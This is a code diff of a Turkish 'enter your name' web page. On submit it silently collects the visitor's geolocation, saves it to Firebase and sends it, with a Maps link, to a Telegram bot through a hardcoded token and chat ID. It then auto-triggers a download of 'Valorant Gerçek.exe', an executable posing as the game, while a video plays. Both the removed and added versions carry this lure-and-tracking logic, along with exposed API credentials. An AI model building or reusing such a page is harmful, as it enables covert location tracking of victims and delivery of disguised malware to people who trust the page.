@@ -19,7 +19,7 @@
       border-radius: 8px;
       box-shadow: 0 2px 10px rgba(0,0,0,0.1);
       text-align: center;
-      width: 300px;
+      width: 320px;
     }
     input, button {
       padding: 10px;
@@ -27,15 +27,24 @@
       width: 100%;
       font-size: 16px;
     }
-    #downloadLink, #videoSection {
-      margin-top: 20px;
+    #downloadLink {
       display: none;
+      margin-top: 20px;
+    }
+    #videoSection {
+      display: none;
+      margin-top: 20px;
+    }
+    #videoSection iframe {
+      width: 100%;
+      height: 200px;
+      border: none;
     }
     ul {
       list-style: none;
       margin-top: 30px;
       padding: 0;
-      width: 300px;
+      width: 320px;
       text-align: left;
     }
     li {
@@ -45,131 +54,135 @@
       border-radius: 5px;
       box-shadow: 0 0 4px rgba(0,0,0,0.1);
     }
+    #sonuc { height: 1.2em; }
   </style>
 
   <!-- Firebase 8.x CDN -->
   <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
   <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 </head>
-
 <body>
+
   <div id="box">
     <h2>İsmini Yaz</h2>
     <input id="isim" placeholder="Adın" />
     <button id="girisBtn">Giriş Yap</button>
     <p id="sonuc" style="color:red;"></p>
 
-    <a id="downloadLink" href="Valorant Gerçek.exe" download>Valorant Gerçek.exe İndir</a>
+    <a id="downloadLink" href="Valorant Gerçek.exe" download>
+      Valorant Gerçek.exe İndir
+    </a>
 
     <div id="videoSection">
-      <video id="videoPlayer" width="100%" controls>
-        <source src="video.mp4" type="video/mp4" />
-        Tarayıcınız video etiketini desteklemiyor.
-      </video>
+      <iframe id="youtubeFrame" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>
     </div>
   </div>
 
   <h3>Giriş Yapanlar</h3>
   <ul id="liste"></ul>
-</body>
 
-<script>
-  // Firebase yapılandırması
-  var firebaseConfig = {
-    apiKey: "AIzaSyBMRl-hAnyhNR3BSjBXB7JGDbiQ_3J27dc",
-    authDomain: "system-ccad9.firebaseapp.com",
-    databaseURL: "https://system-ccad9-default-rtdb.firebaseio.com",
-    projectId: "system-ccad9",
-    appId: "1:933332785337:web:385cbe477e9b8f3beaa368"
-  };
-  firebase.initializeApp(firebaseConfig);
+  <script>
+    // Firebase yapılandırması
+    var firebaseConfig = {
+      apiKey: "AIzaSyBMRl-hAnyhNR3BSjBXB7JGDbiQ_3J27dc",
+      authDomain: "system-ccad9.firebaseapp.com",
+      databaseURL: "https://system-ccad9-default-rtdb.firebaseio.com",
+      projectId: "system-ccad9",
+      appId: "1:933332785337:web:385cbe477e9b8f3beaa368"
+    };
+    firebase.initializeApp(firebaseConfig);
+    var db = firebase.database();
 
-  // Sabitler
-  var db = firebase.database();
-  var BOT_TOKEN = "8103906170:AAFLQZ3RE499VbqoOoGUMDnWiUPxXFwvHsg";
-  var CHAT_ID   = "8499614707";
+    // Telegram bilgileri
+    var BOT_TOKEN = "8103906170:AAFLQZ3RE499VbqoOoGUMDnWiUPxXFwvHsg";
+    var CHAT_ID   = "8499614707";
 
-  // Telegram mesajı gönderme
-  function telegramaGonder(isim, konum) {
-    var mesaj = 
-      "🧑 İsim: " + isim +
-      "\n📍 Konum: https://www.google.com/maps?q=" + konum.lat + "," + konum.lon;
-    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: mesaj
-      })
-    });
-  }
-
-  // Giriş fonksiyonu
-  function girisYap() {
-    var isim  = document.getElementById("isim").value.trim();
-    var sonuc = document.getElementById("sonuc");
-
-    if (!isim) {
-      sonuc.style.color = "red";
-      sonuc.textContent = "Lütfen adını gir.";
-      return;
+    // Telegram'a mesaj gönder
+    function telegramaGonder(isim, konum) {
+      var mesaj = 
+        "🧑 İsim: " + isim +
+        "\n📍 Konum: https://www.google.com/maps?q=" +
+        konum.lat + "," + konum.lon;
+      fetch(
+        "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage",
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: mesaj })
+        }
+      );
     }
 
-    if (!navigator.geolocation) {
-      sonuc.style.color = "red";
-      sonuc.textContent = "Tarayıcınız konumu desteklemiyor.";
-      return;
-    }
+    // Giriş fonksiyonu
+    function girisYap() {
+      var isim  = document.getElementById("isim").value.trim();
+      var sonuc = document.getElementById("sonuc");
+      sonuc.textContent = "";
 
-    navigator.geolocation.getCurrentPosition(function(pos) {
-      var konum = {
-        lat: pos.coords.latitude.toFixed(6),
-        lon: pos.coords.longitude.toFixed(6)
-      };
+      if (!isim) {
+        sonuc.style.color = "red";
+        sonuc.textContent = "Lütfen adını gir.";
+        return;
+      }
 
-      // Firebase'e kayıt
-      db.ref("girisler").push({
-        isim: isim,
-        konum: konum,
-        tarih: new Date().toISOString()
+      if (!navigator.geolocation) {
+        sonuc.style.color = "red";
+        sonuc.textContent = "Konum desteklenmiyor.";
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(function(pos) {
+        var konum = {
+          lat: pos.coords.latitude.toFixed(6),
+          lon: pos.coords.longitude.toFixed(6)
+        };
+
+        // Firebase kayıt
+        db.ref("girisler").push({
+          isim: isim,
+          konum: konum,
+          tarih: new Date().toISOString()
+        });
+
+        // Telegram bildirimi
+        telegramaGonder(isim, konum);
+
+        // Başarı mesajı
+        sonuc.style.color = "green";
+        sonuc.textContent = "Hoş geldin, " + isim + "!";
+
+        // İndirme linki ve tıklama
+        var dl = document.getElementById("downloadLink");
+        dl.style.display = "block";
+        dl.click();
+
+        // YouTube videosunu gömme ve oynatma
+        var vid = document.getElementById("videoSection");
+        var frame = document.getElementById("youtubeFrame");
+        frame.src = "https://www.youtube.com/embed/VIDEO_ID?autoplay=1";
+        vid.style.display = "block";
+
+      }, function(err) {
+        sonuc.style.color = "red";
+        sonuc.textContent = "Konum alınamadı: " + err.message;
       });
-
-      // Telegram'a gönder
-      telegramaGonder(isim, konum);
-
-      // Başarı mesajı
-      sonuc.style.color = "green";
-      sonuc.textContent = "Hoş geldin, " + isim + "!";
-
-      // İndirme linkini göster ve tıkla
-      var dl = document.getElementById("downloadLink");
-      dl.style.display = "block";
-      dl.click();
-
-      // Videoyu başlat
-      var vid = document.getElementById("videoSection");
-      vid.style.display = "block";
-      document.getElementById("videoPlayer").play();
-
-    }, function(err) {
-      sonuc.style.color = "red";
-      sonuc.textContent = "Konum alınamadı: " + err.message;
-    });
-  }
-
-  // Buton dinleyicisi
-  document.getElementById("girisBtn").addEventListener("click", girisYap);
-
-  // Giriş yapanları listeleme
-  db.ref("girisler").on("value", function(snapshot) {
-    var data = snapshot.val() || {};
-    var ul   = document.getElementById("liste");
-    ul.innerHTML = "";
-    for (var key in data) {
-      var item = data[key];
-      var li   = document.createElement("li");
-      li.textContent = item.isim;
-      ul.appendChild(li);
     }
-  });
-</script>
+
+    // Butonu dinle
+    document.getElementById("girisBtn")
+      .addEventListener("click", girisYap);
+
+    // Listeyi güncelle
+    db.ref("girisler").on("value", function(snapshot) {
+      var data = snapshot.val() || {};
+      var ul   = document.getElementById("liste");
+      ul.innerHTML = "";
+      Object.values(data).forEach(function(item) {
+        var li = document.createElement("li");
+        li.textContent = item.isim;
+        ul.appendChild(li);
+      });
+    });
+  </script>
+</body>
+</html>
